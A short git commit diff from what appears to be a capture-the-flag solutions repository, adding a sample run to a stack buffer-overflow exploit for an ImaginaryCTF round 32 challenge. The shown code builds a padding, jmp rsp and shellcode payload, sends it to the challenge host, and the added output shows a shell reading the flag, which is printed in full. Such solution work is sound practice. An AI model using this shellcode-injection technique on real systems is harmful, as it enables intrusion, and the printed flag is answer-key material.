7b62eeaac98761f6428d4f10dc80a3cc0b621517
programmeruser2 <programmeruser@programmeruser.tk>
2023-04-24 19:05:55 -0400

    add ictf simple buffer overflow round 32 note

--- imaginaryctf/round-32/simple-buffer-overflow.py
+++ imaginaryctf/round-32/simple-buffer-overflow.py
@@ -8,4 +8,12 @@ payload = padding + p64(jmp_rsp) + shellcode
 r = remote('simplebufferoverflow.fly.dev', 5000)
 r.sendline(payload)
 r.interactive()
+'''
+user@linux:~/ctf/ctf-solutions/imaginaryctf/round-32$ python3 simple-buffer-overflow.py
+[+] Opening connection to simplebufferoverflow.fly.dev on port 5000: Done
+[*] Switching to interactive mode
+Feed me: $ cat flag.txt
+ictf{sometimes_51mpl3r_is_harder_48309}
+$
+'''
 
